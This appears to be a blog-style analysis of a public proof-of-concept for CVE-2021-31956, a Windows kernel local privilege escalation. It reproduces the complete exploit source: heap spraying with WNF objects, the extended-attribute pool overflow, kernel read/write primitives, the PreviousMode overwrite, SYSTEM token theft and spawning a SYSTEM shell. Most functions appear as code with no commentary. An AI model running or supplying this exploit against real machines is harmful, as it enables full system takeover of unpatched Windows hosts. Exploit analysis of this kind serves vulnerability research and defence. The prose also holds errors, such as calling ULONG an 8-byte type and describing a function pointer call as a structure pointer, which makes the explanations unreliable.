---
layout: default
---


# Introduction

This paper will serve as a comprehensive analysis of the
[proof-of-concept](https://github.com/Y3A/CVE-2021-31956) the cybersecurity
professional [Y3A](https://github.com/Y3A) developed to exploit
[CVE-2021-31956](https://nvd.nist.gov/vuln/detail/CVE-2021-31956).

CVE-2021-31956 is a Windows kernel local privilege escalation
vulnerability found in multiple Windows versions including but not
limited to [Windows 10 20H2](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31956). The computer
security company Kaspersky first detected the vulnerability as a
actively-exploited issue found [in-the-wild](https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/).

## Exploit Chain

In Kaspersky's initial triage of the discovery, CVE-2021-31956 was part
of a larger chain of vulnerabilities used to escape the Google Chrome
browser and use CVE-2021-31956 to escalate privileges and gain remote
code execution as the Windows kernel.

As mentioned previously, the attackers used
[CVE-2021-21224](https://nvd.nist.gov/vuln/detail/CVE-2021-21224) as a means to escape the Chrome
sandbox and gain remote code execution. Then, the attackers seemingly
used another exploit, chiefly [CVE-2021-31955](https://nvd.nist.gov/vuln/detail/CVE-2021-31955) to
obtain the kernel address of the current process' `EPROCESS` value
to then overwrite the `PreviousMode` offset to then set the current process'
context to that of `SYSTEM`.

## EPROCESS Structure

What is the `EPROCESS` structure? According to [Microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess): 

> The EPROCESS structure is an opaque structure that serves as the process object for a process.

In layman's terms, this basically means that if an attacker obtains the `EPROCESS` memory address for their current process, if they had a kernel-mode write primitive, they would be able to escalate their privileges to `SYSTEM`. The specifics of this technique is described in the next section. 

## PreviousMode Overwrite

As noted by Kaspersky, traditionally, an attacker would steal the `SYSTEM` token to escalate privileges. However, by overwriting the `PreviousMode` field with `0x0`, it is possible to then execute various routines from user-made in kernel-mode. This means that with the `PreviousMode` field set to `0x0`, parameters are trusted and thus are not checked by the kernel. 

# Analyzing the Source File

## Include Directives

To start things off, we will examine the import section of the
proof-of-concept. As with most C++ source code, the first section is
usually a series of `#include` directives:

```
#include <stdio.h>
#include <Windows.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include "CVE-2021-31956.h"
```

As defined by [Microsoft](https://learn.microsoft.com/en-us/cpp/preprocessor/hash-include-directive-c-cpp?view=msvc-170), the `#include`
directive informs the C++ preprocessor to add the contents of the
specified file at the location of the `#include` directive in the source
code.

Looking at the above code block, we notice the first four `#include`
directives use angle bracket notation whereas the last `#include`
directive uses the quotation notation to describe the target header
file. According to the [GNU Foundation](https://gcc.gnu.org/onlinedocs/cpp/Include-Syntax.html), angle brackets
or `#include <file>` are used to specify system header files. However,
double quotation marks or `#include "file"` are used to define a
user-generated header file. The search location for angle bracket
`#include` directives is within a standard list of system directories
whereas for double quotation mark `#include` directives the search
location is within the directory of the source code.

## NULL-Pointer Declarations

Moving on, we now examine the NULL-pointer declaration and type-casting
used prior to the `main` function:

```
NQSI _NtQuerySystemInformation = (NQSI)NULL;
NQEF _NtQueryEaFile = (NQEF)NULL;
NSEF _NtSetEaFile = (NSEF)NULL;
NCWSN _NtCreateWnfStateName = (NCWSN)NULL;
NUWSD _NtUpdateWnfStateData = (NUWSD)NULL;
NDWSN _NtDeleteWnfStateName = (NDWSN)NULL;
NDWSD _NtDeleteWnfStateData = (NDWSD)NULL;
NQWSD _NtQueryWnfStateData = (NQWSD)NULL;
NRVM _NtReadVirtualMemory = (NRVM)NULL;
NWVM _NtWriteVirtualMemory = (NWVM)NULL;
```

In order to effectively break each line down, we will also pair each
NULL-pointer declaration and type-casting to its respective type
definition found in the `CVE-2021-31956.h` header file. To start things
off, let's look at the first line:

```
NQSI _NtQuerySystemInformation = (NQSI)NULL;
```

Here, we see that the variable `_NtQuerySystemInformation` is of type
`NQSI` with the same type being type-cast to the value `NULL`. According
to [East Carolina University](http://www.cs.ecu.edu/karl/3300/spr14/Notes/C/typedef.html), it is possible to use
`typedef` to give a function type a name. For example,

```
typedef NTSTATUS(NTAPI *NQSI) (
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
```

Would define the function pointer `NQSI` of type `NTAPI` to be the type
of the function that takes 4 arguments and returns an `NTSTATUS` value.
Without loss of generality, it is possible to use this same approach to
the other NULL-pointer declarations and type-castings.

## The write64 Function

Moving on, we will now look at the `write64` function:

```
void write64(ULONG_PTR addr, UINT64 data)
{
    char    buf[8] = { 0 };
    ULONG   wrote;

    *(UINT64 *)buf = data;
    _NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &wrote);

    return;
}
```

Looking at the `write64` function declaration, namely:

```
void write64(ULONG_PTR addr, UINT64 data)
```

We notice it has a return value of `void` indicating that it does not
return a value. In addition, we see that it takes a Unsigned Long
pointer and a Unsigned 64-bit integer as input. Examining the function
definition we see the following:

```
char    buf[8] = { 0 };
ULONG   wrote;

*(UINT64 *)buf = data;
_NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &wrote);

return;
```

First, a `char` array called `buf` and of size `8` with its elements
initialized to `0`. We also notice the variable `wrote` is declared of
type `ULONG`. According to [Microsoft](https://learn.microsoft.com/en-us/dotnet/visual-basic/language-reference/data-types/ulong-data-type), a `ULong`
data type contains an `8`-byte unsigned integer. Next, we see the
pointer `buf` being cast to a pointer of type `UINT64` before being
dereferenced and given the value of `data`. As such, the datatype of the
content pointed to by `buf` will now be interpreted as a `UINT`, in this
case as a 64-bit unsigned integer.

Before examining the final line, let's look at the type definition for
the `NWVM` datatype:

```
typedef NTSTATUS (NTAPI *NWVM)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);
```

We are looking at the type definition for `NWVM` as a function prototype
for `_NtWriteVirtualMemory` does not exist in this file and it seems
what the author did was use the NULL-pointer declaration and
type-casting

```
NWVM _NtWriteVirtualMemory = (NWVM)NULL;
```

To create a NULL-pointer named `_NtWriteVirtualMemory` of type `NWVM`
where they then called this pointer in the third to final line in
`write64`:

```
_NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &wrote);
```

As we can see from the `NWVM` datatype type definition, we have the
following observations:

-   The returned handle from `GetCurrentProcess()` is passed as
    `ProcessHandle`.

-   The void pointer `addr` provided as the first input value is passed
    as `BaseAddress`.

-   The Unsigned 64-bit integer pointer `buf` is passed as `Buffer`
    which has the void pointer datatype.

-   The hexadecimal value `0x8` is passed as the Unsigned Long
    `NumberOfBytesToWrite`.

-   The memory address `&wrote` is passed as the output buffer
    `NumberOfBytesWritten`.

Interestingly enough, since `_NtWriteVirtualMemory` was not called as a
function, but rather as a pointer to a structure, the return value is
not assigned to a variable within the function. Instead after calling
`_NtWriteVirtualMemory`, the function simply returns with no return
value.

## The read64 Function

Below we have the complete `read64` function:

```
UINT64 read64(ULONG_PTR addr)
{
    char    buf[8] = { 0 };
    ULONG   read;

    _NtReadVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &read);

    return *(UINT64 *)buf;
}
```

Looking at the `read64` function declaration, we see that it accepts a
Unsigned Long pointer called `addr` as input and returns a Unsigned
64-bit integer:

```
UINT64 read64(ULONG_PTR addr)
```

Next, as with the `write64` function, we notice that a `char` array and
a Unsigned Long value are declared with the `buf` character array being
initialized to `0`.

## The fix_runrefs Function

```
NTSTATUS fix_runrefs(_In_ PWNF_PROCESS_CONTEXT ctx)
{
    NTSTATUS            status = STATUS_SUCCESS;
    PLIST_ENTRY         head = (PLIST_ENTRY)read64(&(ctx->TemporaryNamesListHead));
    PLIST_ENTRY         next = read64(head);
    PWNF_NAME_INSTANCE  cur = CONTAINING_RECORD(next, WNF_NAME_INSTANCE, TemporaryNameListEntry);

    for (; next != head; next = read64(next), cur = CONTAINING_RECORD(next, WNF_NAME_INSTANCE, TemporaryNameListEntry))
        if ((UINT64)read64(&(cur->Header)) != (UINT64)0x0000000000A80903) {
            write64(&(cur->Header), (UINT64)0x0000000000A80903);
            write64(&(cur->RunRef), (UINT64)0x0000000000000000);
        }

    puts("[+] Fixed all overwritten header and runrefs");

    return status;
}
```

## The steal_token Function

```
NTSTATUS steal_token(_In_ PEPROCESS own_eproc)
{
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    PLIST_ENTRY         next = (PLIST_ENTRY)read64(&(own_eproc->ActiveProcessLinks));
    PEPROCESS           cur = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);

    for (; cur != own_eproc; next = (PLIST_ENTRY)read64(next), cur = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks))
        if ((UINT64)read64(&(cur->UniqueProcessId)) == (UINT64)0x4) {
            write64(&(own_eproc->Token), read64(&(cur->Token)));
            status = STATUS_SUCCESS;
            puts("[+] Stole system token!");
            goto out;
        }

    log_warn("Unable to find system process token");

out:
    return status;
}
```

## The write_pool Function

```
NTSTATUS write_pool(_In_ PWNF_STATE_NAME statenames, _In_ ULONG idx, _In_ char *buf, _In_ ULONG buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    UINT64                  name = 0;

    name = (UINT64)(*(UINT64 *)(statenames[idx].Data));

    status = _NtUpdateWnfStateData((PCWNF_STATE_NAME)&name, buf, buf_sz, NULL, NULL, 0, 0);
    if (!NT_SUCCESS(status)) {
        log_warn("write_pool::_NtUpdateWnfStateData()1");
        goto out;
    }

    puts("[+] Successfully updated adjacent WNF_NAME_INSTANCE");

out:
    return status;
}
```

## The read_pool Function

```

NTSTATUS read_pool(_In_ PWNF_STATE_NAME statenames, _In_ ULONG idx, _Out_ char *buf, _Inout_ PULONG buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    WNF_CHANGE_STAMP        stamp = 0;
    UINT64                  name = 0;

    name = (UINT64)(*(UINT64 *)(statenames[idx].Data));

    status = _NtQueryWnfStateData((PCWNF_STATE_NAME)&name, NULL, NULL, &stamp, buf, buf_sz);
    if (!NT_SUCCESS(status)) {
        log_warn("read_pool::_NtQueryWnfStateData()1");
        goto out;
    }

out:
    return status;
}
```

## The find_chunk Function

```
NTSTATUS find_chunk(_In_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _Out_ char *buf, _Inout_ PULONG buf_sz, _Out_ PULONG idx)
{
    NTSTATUS                status = STATUS_SUCCESS;
    WNF_CHANGE_STAMP        stamp = 0;
    UINT64                  name = 0;
    int                     overflow = -1;

    for (int i = 0; i < count; i++) {
        if (!statenames[i].Data[0])
            continue;

        name = (UINT64)(*(UINT64 *)(statenames[i].Data));
        status = _NtQueryWnfStateData((PCWNF_STATE_NAME)&name, NULL, NULL, &stamp, buf, buf_sz);

        if ((ULONG)stamp == 0x5000) {
            overflow = i; // found our overflow chunk index
            printf("[+] Successfully overflowed into a WNF_STATE_DATA chunk at index 0x%x\n", overflow);
            break;
        }

        if (!NT_SUCCESS(status)) {
            log_warn("find_chunk::_NtQueryWnfStateData()1");
            goto out;
        }
    }

    if (overflow == -1) {
        // means we corrupted a wnf name instance instead of name header, should overflow again.
        // we will fix these corrupted wnf name instances in the end.
        log_warn("Did not overflow a WNF_STATE_DATA chunk, overflow again!");
        status = STATUS_UNSUCCESSFUL;
        goto out;
    }
    else
        status = STATUS_SUCCESS;

    *idx = overflow;

out:
    return status;
}
```

## The overflow_chunk Function

```
NTSTATUS overflow_chunk(_In_ USHORT overflow_chunk_sz, _In_ char *overflow_data, _In_ USHORT overflow_data_sz)
{
    NTSTATUS                    status = STATUS_SUCCESS;
    HANDLE                      file = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK             x = { 0 };
    FILE_FULL_EA_INFORMATION    *fetched_data = zalloc(0x300);
    FILE_GET_EA_INFORMATION     *vuln_selector = zalloc(0x300);
    FILE_GET_EA_INFORMATION     *vuln_selector2;
    FILE_FULL_EA_INFORMATION    *payload = zalloc(0x300);
    FILE_FULL_EA_INFORMATION    *overflow;
    
    file = CreateFileA("c:\\users\\chenl\\desktop\\ABC.txt",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (file == INVALID_HANDLE_VALUE) {
        log_warn("overflow_chunk::_CreateFileA()1");
        goto out;
    }

    if (!fetched_data || !vuln_selector || !payload) {
        log_warn("overflow_chunk::zalloc()1");
        goto out;
    }

    vuln_selector->EaNameLength = (UCHAR)strlen(EANAME1);
    memcpy(vuln_selector->EaName, EANAME1, vuln_selector->EaNameLength);
    vuln_selector->NextEntryOffset = (ULONG)0xc;

    vuln_selector2 = (PFILE_GET_EA_INFORMATION)((UINT64)vuln_selector + (UINT64)(vuln_selector->NextEntryOffset));
    vuln_selector2->EaNameLength = (UCHAR)strlen(EANAME2);
    memcpy(vuln_selector2->EaName, EANAME2, vuln_selector2->EaNameLength);
    vuln_selector2->NextEntryOffset = (ULONG)0x0;

    payload->Flags = (UCHAR)0x0;
    payload->EaNameLength = (UCHAR)strlen(EANAME1);
    payload->EaValueLength = (USHORT)0x9d;
    memcpy(payload->EaName, EANAME1, payload->EaNameLength);
    memset(payload->EaName + payload->EaNameLength + 0x1, 'C', payload->EaValueLength);
    payload->NextEntryOffset = (ULONG)((payload->EaNameLength + payload->EaValueLength + 0x3 + 0x9) & (~0x3));

    overflow = (PFILE_FULL_EA_INFORMATION)((UINT64)payload + (UINT64)(payload->NextEntryOffset));
    overflow->NextEntryOffset = (ULONG)0x0;
    overflow->Flags = (UCHAR)0x0;
    overflow->EaNameLength = (UCHAR)strlen(EANAME2);
    overflow->EaValueLength = (USHORT)overflow_chunk_sz;
    memcpy(overflow->EaName, EANAME2, overflow->EaNameLength);
    memcpy(overflow->EaName + overflow->EaNameLength + 0x1, overflow_data, overflow_data_sz); // goal: overflow the first 0x10 bytes after the next pool header, so 0x20 bytes.

    status = _NtSetEaFile(file, &x, payload, 0x300);
    if (!NT_SUCCESS(status)) {
        log_warn("overflow_chunk::_NtSetEaFile()1");
        goto out;
    }

    status = _NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
    if (!NT_SUCCESS(status)) {
        log_warn("overflow_chunk::_NtQueryEaFile()1");
        goto out;
    }

    puts("[+] Overflowed into neighbouring chunk");

out:
    if (file && file != INVALID_HANDLE_VALUE)
        CloseHandle(file);

    if (fetched_data)
        free(fetched_data);

    if (vuln_selector)
        free(vuln_selector);

    if (payload)
        free(payload);

    return status;
}
```

## The fragment_heap Function

```
NTSTATUS fragment_heap(_Inout_ PWNF_STATE_NAME statenames, _In_ UINT64 count)
{
    NTSTATUS    status = STATUS_SUCCESS;
    UINT64      counter = 0;

    for (int i = 0; i < count; i += 3) {
        // create holes
        status = _NtDeleteWnfStateData(&(statenames[i]), NULL);
        if (!NT_SUCCESS(status)) {
            log_warn("fragment_heap::_NtDeleteWnfStateData()1");
            goto out;
        }

        status = _NtDeleteWnfStateName(&(statenames[i]));
        if (!NT_SUCCESS(status)) {
            log_warn("fragment_heap::_NtDeleteWnfStateData()1");
            goto out;
        }

        statenames[i].Data[0] = 0;
        statenames[i].Data[1] = 0;
        
        counter++;
    }

    printf("[+] Created 0x%llx holes of 0xc0 size in the heap\n", counter * 2);

out:
    return status;
}
```

## The spray_heap Function

```
NTSTATUS spray_heap(_Out_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _In_ char *buf, _In_ UINT64 buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    SECURITY_DESCRIPTOR     *sd = (SECURITY_DESCRIPTOR *)zalloc(sizeof(SECURITY_DESCRIPTOR));

    if (!sd) {
        log_warn("spray_heap::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    sd->Revision = 0x1;
    sd->Sbz1 = 0;
    sd->Control = 0x800c;
    sd->Owner = 0;
    sd->Group = (PSID)0;
    sd->Sacl = (PACL)0;
    sd->Dacl = (PACL)0;

    for (int i = 0; i < count; i++) {
        status = _NtCreateWnfStateName(&(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
        if (!NT_SUCCESS(status)) {
            log_warn("spray_heap::_NtCreateWnfStateName()1");
            goto out;
        }

        status = _NtUpdateWnfStateData(&(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
        if (!NT_SUCCESS(status)) {
            log_warn("spray_heap::_NtUpdateWnfStateName()1");
            goto out;
        }
    }

    printf("[+] Sprayed 0x%llx chunks of 0xc0 sized WNF structures\n", count * 2);

out:
    if (sd)
        free(sd);

    return status;
}
```

## The get_eproc Function

```

NTSTATUS get_eproc(_Out_ PULONG_PTR eproc)
{
    NTSTATUS                   status = STATUS_UNSUCCESSFUL;
    PSYSTEM_HANDLE_INFORMATION handle_info = NULL;
    UINT64                     handle_info_sz = 0x10000;
    HANDLE                     current_proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());

    printf("[+] Finding _EPROCESS address of current process: %ld\n", GetCurrentProcessId());

    handle_info = (PSYSTEM_HANDLE_INFORMATION)zalloc(handle_info_sz);
    if (!handle_info) {
        log_warn("get_eproc::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    while ((status = _NtQuerySystemInformation(
        SystemHandleInformation,
        handle_info,
        handle_info_sz,
        NULL)) == STATUS_INFO_LENGTH_MISMATCH) {

        handle_info = realloc(handle_info, handle_info_sz *= 2);
        if (!handle_info) {
            log_warn("get_eproc::realloc()1");
            status = STATUS_NO_MEMORY;
            goto out;
        }
    }

    if (!NT_SUCCESS(status)) {
        log_warn("get_eproc::NtQuerySystemInformation()1");
        goto out;
    }

    printf("[+] Fetched %ld handles\n", handle_info->NumberOfHandles);

    for (int i = 0; i < handle_info->NumberOfHandles; i++)
        if (handle_info->Handles[i].dwProcessId == GetCurrentProcessId() && handle_info->Handles[i].wValue == current_proc) {
            status = STATUS_SUCCESS;
            printf("[+] _EPROCESS of current process: %p\n", handle_info->Handles[i].pAddress);
            *eproc = (ULONG_PTR)handle_info->Handles[i].pAddress;
            free(handle_info);
            goto out;
        }

out:
    CloseHandle(current_proc);

    return status;
}
```

## The create_cmd Function

```
NTSTATUS create_cmd(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;
    NTSTATUS                status = STATUS_SUCCESS;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        log_warn("create_cmd::CreateProcessA()1");
        status = STATUS_UNSUCCESSFUL;
        goto out;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

out:
    return status;
}
```

## The resolve_symbols Function

```
NTSTATUS resolve_symbols(void)
{
    NTSTATUS    status = STATUS_SUCCESS;
    HMODULE     ntdll = NULL, tmp = NULL;

    puts("[+] Resolving internal functions...");

    ntdll = ((tmp = GetModuleHandleA("ntdll.dll")) ? tmp : LoadLibraryA("ntdll.dll"));
    if (ntdll == NULL) {
        log_warn("resolve_symbols::LoadLibraryA()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    _NtQuerySystemInformation = (NQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    _NtQueryEaFile = (NQEF)GetProcAddress(ntdll, "NtQueryEaFile");
    _NtSetEaFile = (NQSI)GetProcAddress(ntdll, "NtSetEaFile");
    _NtCreateWnfStateName = (NCWSN)GetProcAddress(ntdll, "NtCreateWnfStateName");
    _NtUpdateWnfStateData = (NUWSD)GetProcAddress(ntdll, "NtUpdateWnfStateData");
    _NtDeleteWnfStateName = (NDWSN)GetProcAddress(ntdll, "NtDeleteWnfStateName");
    _NtDeleteWnfStateData = (NDWSD)GetProcAddress(ntdll, "NtDeleteWnfStateData");
    _NtQueryWnfStateData = (NQWSD)GetProcAddress(ntdll, "NtQueryWnfStateData");
    _NtReadVirtualMemory = (NRVM)GetProcAddress(ntdll, "NtReadVirtualMemory");
    _NtWriteVirtualMemory = (NWVM)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    if (!_NtQuerySystemInformation || !_NtQueryEaFile || !_NtSetEaFile ||
        !_NtCreateWnfStateName || !_NtUpdateWnfStateData || !_NtDeleteWnfStateName ||
        !_NtDeleteWnfStateData || !_NtQueryWnfStateData || !_NtReadVirtualMemory || !_NtWriteVirtualMemory) {
        log_warn("resolve_symbols::GetProcAddress()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    puts("[+] All functions resolved");

out:
    return status;
}
```

## The main Function

```
int main(void)
{
    ULONG_PTR               own_eproc = 0;
    PWNF_STATE_NAME         statenames = zalloc(SPRAY_COUNT * sizeof(WNF_STATE_NAME));
    char                    buf[0xa0] = { 0 };
    ULONG                   buf_sz = sizeof(buf);
    ULONG                   overflow_idx = 0;
    char                    *read_data = zalloc(0x5000);
    char                    *write_data = zalloc(0x5000);
    ULONG                   read_data_sz = 0x5000;
    ULONG                   write_data_sz = 0x5000;
    PWNF_NAME_INSTANCE      arbwrite_name = NULL;
    UINT64                  ext_statename = 0;
    ULONG                   fix_size = 0;
    WNF_CHANGE_STAMP        stamp = 0;
    ULONG_PTR               kthread_flink = 0;
    char                    prev_mode[3] = { 0 };
    char                    old_prev_mode[3] = "\x00\x00\x01";
    PEPROCESS               own_eproc_obj = NULL;
    ULONG_PTR               kthreads[MAX_THREAD_SEARCH] = { 0 };
    ULONG_PTR               threadlisthead = 0;
    PWNF_PROCESS_CONTEXT    ctx = NULL;
    
    if (!statenames || !read_data || !write_data) {
        log_warn("main::zalloc()1");
        goto out;
    }

    if (!NT_SUCCESS(resolve_symbols()))
        goto out;

    if (!NT_SUCCESS(get_eproc(&own_eproc)))
        goto out;

    if (!NT_SUCCESS(spray_heap(statenames, SPRAY_COUNT, &buf, sizeof(buf))))
        goto out;

    if (!NT_SUCCESS(fragment_heap(statenames, SPRAY_COUNT)))
        goto out;

    if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
        goto out;

    while (!NT_SUCCESS(find_chunk(statenames, SPRAY_COUNT, &buf, &buf_sz, &overflow_idx)))
        if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
            goto out;

    buf_sz = sizeof(buf);

    if (!NT_SUCCESS(read_pool(statenames, overflow_idx, read_data, &read_data_sz)))
        goto out;

    read_data_sz = 0x5000;
    memcpy(write_data, read_data, 0x5000);

    for (int i = 0; i < 0x5000; i++)
        if ((unsigned char)read_data[i] == 0x03 && (unsigned char)read_data[i + 1] == 0x09 && (unsigned char)read_data[i + 2] == 0xa8) {
            arbwrite_name = (PWNF_NAME_INSTANCE)(&write_data[i]);
            printf("[+] Found a WNF_NAME_INSTANCE structure at offset %x to our corrupted WNF_STATE_DATA\n", i);
            fix_size = i + 0x60;
            break;
        }

    if (!arbwrite_name) {
        log_warn("No WNF_NAME_INSTANCE near our corrupted WNF_STATE_DATA, probably not exploitable");
        goto out;
    }
     
    threadlisthead = (ULONG_PTR)((ULONG_PTR)own_eproc + (ULONG_PTR)0x30);
    arbwrite_name->StateData = threadlisthead;
    
    if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
        goto out;

    ext_statename = *(PULONGLONG)&(arbwrite_name->StateName) ^ STATENAME_CONST;

    _NtQueryWnfStateData((WNF_STATE_NAME *)&ext_statename, NULL, NULL, &stamp, write_data, &write_data_sz); // this call will fail, so we don't error check
    
    kthread_flink = (UINT64)stamp << 32 | (UINT32)write_data_sz;
    write_data_sz = 0x5000;
    memcpy(write_data, read_data, 0x5000);

    kthreads[0] = (UINT64)kthread_flink - (UINT64)0x2f8;
    if ((UINT64)kthreads[0] < 0xFFFF800000000000) {
        log_warn("Fail to find _KTHREAD in memory");
        goto out;
    }

    printf("[+] Found _KTHREAD 1 at %p\n", kthreads[0]);

    for (int i = 1; i < MAX_THREAD_SEARCH; i++) {
        arbwrite_name->StateData = kthread_flink; // find next kthread

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        ext_statename = *(PULONGLONG) & (arbwrite_name->StateName) ^ STATENAME_CONST;

        _NtQueryWnfStateData((WNF_STATE_NAME *)&ext_statename, NULL, NULL, &stamp, write_data, &write_data_sz); // this call will fail, so we don't error check

        kthread_flink = (UINT64)stamp << 32 | (UINT32)write_data_sz;
        if ((UINT64)kthread_flink == (UINT64)threadlisthead)
            break;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        kthreads[i] = (UINT64)kthread_flink - (UINT64)0x2f8;
        if ((UINT64)kthreads[i] < 0xFFFF800000000000) {
            log_warn("Fail to find _KTHREAD in memory");
            goto out;
        }

        printf("[+] Found _KTHREAD %d at %p\n", i+1, kthreads[i]);
    }
    
    for (int i = 0; i < MAX_THREAD_SEARCH; i++) {
        if (kthreads[i] == 0)
            break;

        arbwrite_name->StateData = (UINT64)kthreads[i] + 0x220; // kthread.Process

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        ext_statename = *(PULONGLONG)&(arbwrite_name->StateName) ^ STATENAME_CONST;
        if (!NT_SUCCESS(_NtUpdateWnfStateData((WNF_STATE_NAME *)&ext_statename, prev_mode, 0x3, NULL, NULL, 0, 0))) {
            log_warn("main::_NtUpdateWnfStateData()1");
            goto out;
        }

        printf("[+] Overwritten PreviousMode of _KTHREAD %d to 0\n", i+1);
    }
    

    own_eproc_obj = (PEPROCESS)own_eproc;

    if (!NT_SUCCESS(steal_token(own_eproc_obj)))
        goto out;

    ctx = read64(&(own_eproc_obj->WnfContext));

    if (!NT_SUCCESS(fix_runrefs(ctx)))
        goto out;

    for (int i = 0; i < MAX_THREAD_SEARCH; i++) {
        if (kthreads[i] == 0)
            break;

        arbwrite_name->StateData = (UINT64)kthreads[i] + 0x220; // kthread.Process

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        ext_statename = *(PULONGLONG) & (arbwrite_name->StateName) ^ STATENAME_CONST;
        if (!NT_SUCCESS(_NtUpdateWnfStateData((WNF_STATE_NAME *)&ext_statename, old_prev_mode, 0x3, NULL, NULL, 0, 0))) {
            log_warn("main::_NtUpdateWnfStateData()1");
            goto out;
        }

        printf("[+] Restored PreviousMode of _KTHREAD %d to 1\n", i + 1);
    }

    if (!NT_SUCCESS(write_pool(statenames, overflow_idx, read_data, fix_size)))
        goto out;

    puts("[+] Restored corrupted adjacent WNF_NAME_INSTANCE");

    if (NT_SUCCESS(create_cmd()))
        puts("[+] Enjoy system shell");

out:
    if (statenames)
        free(statenames);

    if (read_data)
        free(read_data);

    if (write_data)
        free(write_data);

    return 0;
}
```
